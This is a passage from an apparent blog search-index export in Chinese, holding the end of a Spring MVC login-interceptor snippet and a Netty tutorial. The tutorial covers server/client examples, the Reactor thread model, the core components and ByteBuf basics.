function_">sendJsonMessage</span><span class="params">(HttpServletResponse response, Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">g</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json; charset=utf-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        writer.print(g.toJson(obj));</span><br><span class="line">        writer.close();</span><br><span class="line">        response.flushBuffer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>补充下<code>WebMvcConfigurer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntercepterConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> LoginInterceptor loginInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        <span class="comment">// 拦截user下的api</span></span><br><span class="line">        registry.addInterceptor(loginInterceptor)</span><br><span class="line">            .addPathPatterns(<span class="string">&quot;/api/**&quot;</span>)</span><br><span class="line">            .excludePathPatterns(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Netty</title>
    <url>/2021/10/29/2021/netty/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Netty简介"><a href="#Netty简介" class="headerlink" title="Netty简介"></a>Netty简介</h1><p>NIO 的类库和 API 繁杂、使用麻烦，需要熟练掌握Selector、ServerSocketChannel、SocketChannel、ByteBuffer等API的使用。 除此之外，NIO开发工作量和难度都非常大，例如客户端面临断线重连、网络闪断、心跳处理、半包读写、 网络拥塞和异常流的处理等等。</p>
<p>Netty 对 JDK 自带的 NIO 的 API 进行了良好的封装，解决了上述问题。且Netty拥有高性能、 吞吐量更高、延迟更低、减少资源消耗、最小化不必要的内存复制等优点。Netty 现在都在用的是4.x，5.x版本已经废弃，Netty 4.x 需要JDK 6以上版本支持。</p>
<h2 id="Netty简单案例"><a href="#Netty简单案例" class="headerlink" title="Netty简单案例"></a>Netty简单案例</h2><p>首先在项目中引入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.netty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>netty-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.48.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>首先编写服务端代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 个线程组bossGroup和workerGroup，它们相当于线程池</span></span><br><span class="line">        <span class="comment">// 有的子线程NioEventLoop的个数默认为cpu核数的两倍</span></span><br><span class="line">        <span class="comment">// bossGroup只是处理连接请求，真正的和客户端的读写业务会交给workerGroup处理</span></span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">bossGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建服务器端的启动对象</span></span><br><span class="line">            <span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line">            <span class="comment">// 使用链式编程来配置参数</span></span><br><span class="line">            <span class="comment">// 设置两个线程组</span></span><br><span class="line">            bootstrap.group(bossGroup, workerGroup) </span><br><span class="line">                     <span class="comment">//使用NioServerSocketChannel作为服务器的通道实现</span></span><br><span class="line">                    .channel(NioServerSocketChannel.class) </span><br><span class="line">                     <span class="comment">/* 初始化服务器连接队列大小，服务端处理客户端连接请求是顺序处理的,</span></span><br><span class="line"><span class="comment">                        所以同一时间只能处理一个客户端连接。多个客户端同时来的时候,</span></span><br><span class="line"><span class="comment">                        服务端将不能处理的客户端连接请求放在队列中等待处理*/</span></span><br><span class="line">                    .option(ChannelOption.SO_BACKLOG, <span class="number">1024</span>)</span><br><span class="line">                     <span class="comment">// 创建通道初始化对象，设置初始化参数</span></span><br><span class="line">                    .childHandler(<span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                            <span class="comment">// 对workerGroup中的SocketChannel的管道pipline中添加处理器</span></span><br><span class="line">                            ch.pipeline().addLast(<span class="keyword">new</span> <span class="title class_">NettyServerHandler</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">            System.out.println(<span class="string">&quot;netty server start。。&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* bind方法异步绑定, 生成了一个ChannelFuture异步对象，</span></span><br><span class="line"><span class="comment">               通过isDone等方法可以判断异步事件的执行情况。</span></span><br><span class="line"><span class="comment">               bind是异步操作，通过sync方法是等待异步操作执行完毕*/</span></span><br><span class="line">            <span class="comment">// 这里也是绑定的处理逻辑</span></span><br><span class="line">            <span class="type">ChannelFuture</span> <span class="variable">cf</span> <span class="operator">=</span> bootstrap.bind(<span class="number">8888</span>).sync();</span><br><span class="line">            <span class="comment">// 可以给ChannelFuture注册监听器，监听我们关心的事件</span></span><br><span class="line">            <span class="comment">/*cf.addListener(new ChannelFutureListener() &#123;</span></span><br><span class="line"><span class="comment">                @Override</span></span><br><span class="line"><span class="comment">                public void operationComplete(ChannelFuture future) throws Exception &#123;</span></span><br><span class="line"><span class="comment">                    if (cf.isSuccess()) &#123;</span></span><br><span class="line"><span class="comment">                        System.out.println(&quot;监听端口8888成功&quot;);</span></span><br><span class="line"><span class="comment">                    &#125; else &#123;</span></span><br><span class="line"><span class="comment">                        System.out.println(&quot;监听端口8888失败&quot;);</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125;);*/</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* 对通道关闭进行监听，closeFuture是异步操作，监听通道关闭</span></span><br><span class="line"><span class="comment">               通过sync方法同步等待通道关闭处理完毕，这里会阻塞等待通道关闭完成*/</span></span><br><span class="line">            <span class="comment">// 阻塞住了</span></span><br><span class="line">            cf.channel().closeFuture().sync();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 关闭两个NioEventLoopGroup</span></span><br><span class="line">            bossGroup.shutdownGracefully();</span><br><span class="line">            workerGroup.shutdownGracefully();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的处理器代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义的Handler需要继承netty中规定好的某个HandlerAdapter</span></span><br><span class="line"><span class="comment"> * 其中可以重写很多方法，根据需要选择几个方法重写</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyServerHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取客户端发送的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ctx 上下文对象, 含有通道channel，管道pipeline</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> msg 就是客户端发送的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;服务器读取线程 &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Channel channel = ctx.channel();</span></span><br><span class="line">        <span class="comment">//ChannelPipeline pipeline = ctx.pipeline(); //本质是一个双向链接, 出站入站</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//将msg转成一个ByteBuf，类似NIO中的ByteBuffer</span></span><br><span class="line">        <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> (ByteBuf) msg;</span><br><span class="line">        System.out.println(<span class="string">&quot;客户端发送消息是:&quot;</span> + buf.toString(CharsetUtil.UTF_8));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据读取完毕处理方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ctx</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelReadComplete</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 构建消息</span></span><br><span class="line">        <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> Unpooled.copiedBuffer(<span class="string">&quot;HelloClient&quot;</span>, CharsetUtil.UTF_8);</span><br><span class="line">        <span class="comment">// 通过上下文对象将消息发送给客户端</span></span><br><span class="line">        ctx.writeAndFlush(buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理异常, 一般是需要关闭通道</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ctx</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cause</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exceptionCaught</span><span class="params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>接着编写客户端代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 客户端只需要一个事件循环组NioEventLoopGroup</span></span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">group</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建客户端启动对象，和服务端的不一样</span></span><br><span class="line">            <span class="type">Bootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bootstrap</span>();</span><br><span class="line">            <span class="comment">// 设置相关参数</span></span><br><span class="line">            <span class="comment">// //设置线程组</span></span><br><span class="line">            bootstrap.group(group) </span><br><span class="line">                     <span class="comment">// 使用NioSocketChannel作为客户端的通道实现</span></span><br><span class="line">                    .channel(NioSocketChannel.class) </span><br><span class="line">                     <span class="comment">// 创建通道初始化对象，设置初始化参数</span></span><br><span class="line">                    .handler(<span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel channel)</span> </span><br><span class="line">                            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                            <span class="comment">// 向SocketChannel的管道pipline中添加处理器</span></span><br><span class="line">                            channel.pipeline().addLast(<span class="keyword">new</span> <span class="title class_">NettyClientHandler</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">            System.out.println(<span class="string">&quot;netty client start&quot;</span>);</span><br><span class="line">            <span class="comment">//这里都是在等待结果，保证程序不宕掉</span></span><br><span class="line">            <span class="comment">// 启动客户端去连接服务器端</span></span><br><span class="line">            <span class="type">ChannelFuture</span> <span class="variable">channelFuture</span> <span class="operator">=</span> bootstrap.connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9000</span>).sync();</span><br><span class="line">            <span class="comment">// 对关闭通道进行监听</span></span><br><span class="line">            channelFuture.channel().closeFuture().sync();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 关闭NioEventLoopGroup</span></span><br><span class="line">            group.shutdownGracefully();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中的处理器代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyClientHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当客户端连接服务器完成就会触发该方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ctx</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelActive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> Unpooled.copiedBuffer(<span class="string">&quot;HelloServer&quot;</span>, CharsetUtil.UTF_8);</span><br><span class="line">        ctx.writeAndFlush(buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当通道有读取事件时会触发，即服务端发送数据给客户端</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ctx 上下文对象, 含有通道channel，管道pipeline</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> msg 就是客户端发送的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> (ByteBuf) msg;</span><br><span class="line">        System.out.println(<span class="string">&quot;收到服务端的消息:&quot;</span> + buf.toString(CharsetUtil.UTF_8));</span><br><span class="line">        System.out.println(<span class="string">&quot;服务端的地址： &quot;</span> + ctx.channel().remoteAddress());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异常情况出现关闭连接</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exceptionCaught</span><span class="params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        cause.printStackTrace();</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Netty设计思想"><a href="#Netty设计思想" class="headerlink" title="Netty设计思想"></a>Netty设计思想</h2><p>看完代码，我们发现Netty框架的目标就是让你的业务逻辑从网络基础应用编码中分离出来，让你可以专注业务的开发（处理器），而不需写一大堆类似NIO的网络处理操作。首先来看看Netty的设计思想。之前的NIO模型如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/25/Raw7qpZgVMItcSQ.png"
                      alt="netty1.png"
                ></p>
<p>其中的Reactor可以理解为一个多路复用器Selector加上一个处理线程。</p>
<p>上图中是一个单线程的NIO模型，所有的客户端事件都由服务端的一个线程处理，在事件数量较大的时候单线程的处理能力不足，会造成事件处理的延迟较大。那么可以引入多线程进行事件处理：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/25/GXbuE9Ctkc1nBQ2.png"
                      alt="netty2.png"
                ></p>
<p>服务端通过线程池对事件进行异步处理，极大地提高了事件处理的能力。</p>
<p>但是当事件数量巨大的时候，将事件分发到线程池中也是需要耗时的，这样同样会造成事件处理延迟。那么之后又出现了如下图所示的主从双Reactor架构：</p>
<p>这样就可以拜托从Reactor完成资源的分发处理</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/25/trJZQTmCz8j6MBg.png"
                      alt="netty3.png"
                ></p>
<p>如上图所示，主Reactor只负责处理接收连接的事件，之后将与服务端进行连接的SocketChannel交给从Reactor，之后的读写事件都由从Reactor进行处理，并且从Reactor采用的是多线程模式。</p>
<p>这样的设计模式，将连接事件和比较耗时的读写事件进行分离，可以保证连接事件的及时处理，如果读写事件的处理速度仍然较慢，还可以采用一主多从的模型，这也正是Netty的设计思想。</p>
<h2 id="Netty线程模型"><a href="#Netty线程模型" class="headerlink" title="Netty线程模型"></a>Netty线程模型</h2><p>Netty的线程模型如下图所示：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/25/rQSOgaz5GUPx4Zb.png"
                      alt="netty4.jpg"
                ></p>
<p>Netty抽象出两组线程池BossGroup和WorkerGroup，BossGroup专门负责接收客户端的连接，而WorkerGroup专门负责网络的读写，BossGroup和WorkerGroup类型都是NioEventLoopGroup。</p>
<p>NioEventLoopGroup相当于一个事件循环<strong>线程组</strong>，这个组中含有多个事件循环线程，每一个事件循环线程是NioEventLoop。<strong>每个NioEventLoop都有一个多路复用器Selector</strong>，用于监听注册在其上的socketChannel的网络通讯。每个BossGroup中的NioEventLoop线程内部循环执行的步骤有3步：</p>
<ul>
<li><p>处理accept事件 , 与client建立连接 , 生成NioSocketChannel</p>
</li>
<li><p>将NioSocketChannel注册到WorkerGroup中的某个NIOEventLoop上的Selector【一个NIOEventLoop有多个的NioSocketChannel</p>
</li>
<li><p>处理任务队列中的非IO任务，即<code>runAllTasks</code>方法</p>
</li>
</ul>
<p>每个WorkerGroup中的NIOEventLoop线程循环执行的步骤如下：</p>
<ul>
<li>轮询注册到自己Selector上的所有NioSocketChannel的read和write事件</li>
<li>处理 I&#x2F;O 事件即read和write 事件，在对应的NioSocketChannel上处理业务</li>
<li><code>runAllTasks</code>方法处理任务队列TaskQueue中的任务 ，一些耗时的业务处理（非IO任务）一般可以放入TaskQueue中慢慢处理，这样不影响数据在pipeline中的流动处理</li>
</ul>
<p>每个WorkerGroup中的NIOEventLoop处理NioSocketChannel业务时会使用<strong>pipeline</strong>(管道)，管道中维护了很多 handler处理器用来处理NioSocketChannel中的数据。</p>
<h2 id="Netty中的组件"><a href="#Netty中的组件" class="headerlink" title="Netty中的组件"></a>Netty中的组件</h2><ul>
<li><strong>【Bootstrap、ServerBootstrap】</strong></li>
</ul>
<p>Bootstrap 意思是引导，一个 Netty 应用通常由一个 Bootstrap 开始，主要作用是配置整个 Netty 程序，串联各个组件，Netty 中 Bootstrap 类是客户端程序的启动引导类，ServerBootstrap 是服务端启动引导类。</p>
<ul>
<li><strong>【Future、ChannelFuture】</strong></li>
</ul>
<p>正如前面介绍，在 Netty 中所有的 IO 操作都是异步的，不能立刻得知消息是否被正确处理。但是可以过同步等待它执行完成或者直接注册一个监听，具体的实现就是通过 Future 和 ChannelFutures，他们可以注册一个监听，当操作执行成功或失败时监听会自动触发注册的监听事件。</p>
<ul>
<li><strong>【Channel】</strong></li>
</ul>
<p>Netty 网络通信的组件，能够用于执行网络 I&#x2F;O 操作。Channel 为用户提供：</p>
<ol>
<li>当前网络连接的通道的状态（例如是否打开、是否已连接）</li>
<li>网络连接的配置参数 （例如接收缓冲区大小）</li>
<li>提供异步的网络 I&#x2F;O 操作（如建立连接，读写，绑定端口），异步调用意味着任何 I&#x2F;O 调用都将立即返回，并且不保证在调用结束时所请求的 I&#x2F;O 操作已完成</li>
<li>调用立即返回一个 ChannelFuture 实例，通过注册监听器到 ChannelFuture 上，可以 I&#x2F;O 操作成功、失败或取消时回调通知调用方。</li>
<li>支持关联 I&#x2F;O 操作与对应的处理程序。</li>
</ol>
<p>不同协议、不同的阻塞类型的连接都有不同的 Channel 类型与之对应。下面是一些常用的 Channel 类型，这些通道涵盖了 UDP 和 TCP 网络 IO 以及文件 IO：</p>
<p>① NioSocketChannel，异步的客户端 TCP Socket 连接。</p>
<p>② NioServerSocketChannel，异步的服务器端 TCP Socket 连接。</p>
<p>③ NioDatagramChannel，异步的 UDP 连接。</p>
<p>④ NioSctpChannel，异步的客户端 Sctp 连接。</p>
<p>⑤ NioSctpServerChannel，异步的 Sctp 服务器端连接。</p>
<ul>
<li><strong>【Selector】</strong></li>
</ul>
<p>Netty 基于 Selector 对象实现 I&#x2F;O 多路复用，通过 Selector 一个线程可以监听多个连接的 Channel 事件。当向一个 Selector 中注册 Channel 后，Selector 内部的机制就可以自动不断地查询这些注册的 Channel 是否有已就绪的 I&#x2F;O 事件（例如可读、可写、网络连接完成等），这样就可以很简单地使用一个线程高效地管理多个Channel。</p>
<ul>
<li><strong>【NioEventLoop】</strong></li>
</ul>
<p>NioEventLoop 中维护了一个线程和任务队列，支持异步提交执行任务，线程启动时会调用 NioEventLoop 的<code>run</code>方法，执行<strong>IO任务</strong>和<strong>非IO任务</strong>。</p>
<p>IO任务就是 Selector 上发生的事件，如 accept、connect、read、write 等，由<code>processSelectedKeys</code>方法触发。非 IO 任务会添加到 taskQueue 中的任务，如 register0、bind0 等任务，由<code>runAllTasks</code>方法触发。</p>
<ul>
<li><strong>【NioEventLoopGroup】</strong></li>
</ul>
<p>NioEventLoopGroup主要管理 NioEventLoop 的生命周期，可以理解为一个线程池，内部维护了一组线程，每个线程（NioEventLoop）负责处理多个 Channel 上的事件，而一个 Channel 只对应于一个线程。</p>
<ul>
<li><strong>【ChannelHandler】</strong></li>
</ul>
<p><strong>ChannelHandler 是一个接口，处理 I&#x2F;O 事件或拦截 I&#x2F;O 操作，并将其转发到其 ChannelPipeline（业务处理链）中的下一个处理程序。ChannelHandler 本身并没有提供很多方法，因为这个接口有许多的方法需要实现，方便使用期间，可以继承它的子类：</strong></p>
<p>① ChannelInboundHandler 用于处理入站 I&#x2F;O 事件（读事件）</p>
<p>② ChannelOutboundHandler 用于处理出站 I&#x2F;O 操作（写事件）</p>
<p>或者使用以下适配器类</p>
<p>① ChannelInboundHandlerAdapter 用于处理入站 I&#x2F;O 事件（读事件）</p>
<p>② ChannelOutboundHandlerAdapter 用于处理出站 I&#x2F;O 操作（写事件）</p>
<ul>
<li><strong>【ChannelHandlerContext】</strong></li>
</ul>
<p>保存 Channel 相关的所有上下文信息，同时关联一个 ChannelHandler 对象。</p>
<ul>
<li><strong>【ChannelPipline】</strong></li>
</ul>
<p>保存 ChannelHandler 的 List，用于处理或拦截 Channel 的入站事件和出站操作。ChannelPipeline 实现了一种高级形式的拦截过滤器模式，使用户可以完全控制事件的处理方式，以及 Channel 中各个的 ChannelHandler 如何相互交互。在 Netty 中每个 Channel 都有且仅有一个 ChannelPipeline 与之对应，它们的组成关系如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/25/G8pKEkxj7Ydt6Qs.png"
                      alt="netty5.jpg"
                ></p>
<p>一个 Channel 包含了一个 ChannelPipeline，而 ChannelPipeline 中又维护了一个由 ChannelHandlerContext 组成的双向链表，并且每个 ChannelHandlerContext 中又关联着一个 ChannelHandler。read事件（入站事件）和write事件（出站事件）在一个双向链表中，入站事件会从链表 head 往后传递到最后一个入站的 handler，出站事件会从链表 tail 往前传递到最前一个出站的 handler，两种类型的 handler 互不干扰。</p>
<h2 id="ByteBuf介绍"><a href="#ByteBuf介绍" class="headerlink" title="ByteBuf介绍"></a>ByteBuf介绍</h2><p>Nio中的缓冲区为ByteBuffer，它的操作比较复杂，因此Netty引入了自己缓冲区ByteBuf。</p>
<h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>从结构上来说，ByteBuf由一串字节数组构成，数组中每个字节用来存放信息。ByteBuf提供了两个索引，一个用于读取数据，一个用于写入数据。这两个索引通过在字节数组中移动，来定位需要读或者写信息的位置。</p>
<p>当从 ByteBuf 读取时，它的readerIndex（读索引）将会根据读取的字节数递增。同样当写ByteBuf时，它的 writerIndex（写索引）也会根据写入的字节数进行递增：</p>
<p>[<img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/02/25/BkwVL5qeYRnlCbf.png"
                      alt="netty6.jpg"
                ></p>
<p>需要注意的是极限的情况是readerIndex刚好读到了writerIndex写入的地方。如果readerIndex超过了 writerIndex的时候，Netty会抛出<code>IndexOutOfBoundsException</code>异常。</p>
<h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p>ByteBuf中的常用API如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyByteBuf</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 通过Unpooled工具类创建byteBuf对象，该对象内部包含一个字节数组byte[10]</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 通过readerindex和writerIndex和capacity，将buffer分成三个区域</span></span><br><span class="line">        <span class="comment">// 已经读取的区域：[0,readerindex)</span></span><br><span class="line">        <span class="comment">// 可读取的区域：[readerindex,writerIndex)</span></span><br><span class="line">        <span class="comment">// 可写的区域: [writerIndex,capacity)</span></span><br><span class="line">        <span class="type">ByteBuf</span> <span class="variable">byteBuf</span> <span class="operator">=</span> Unpooled.buffer(<span class="number">10</span>);</span><br><span class="line">        <span class="comment">// 或者根据已有字符串创建ByteBuf</span></span><br><span class="line">        <span class="type">ByteBuf</span> <span class="variable">byteBuf2</span> <span class="operator">=</span> Unpooled.copiedBuffer(<span class="string">&quot;hello,jimmy!&quot;</span>, CharsetUtil.UTF_8); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// 指定位置写数据</span></span><br><span class="line">            byteBuf.writeByte(i);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;byteBuf=&quot;</span> + byteBuf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// 指定位置读数据</span></span><br><span class="line">            System.out.println(byteBuf.getByte(i));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;byteBuf=&quot;</span> + byteBuf);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// 读数据，readerIndex++</span></span><br><span class="line">     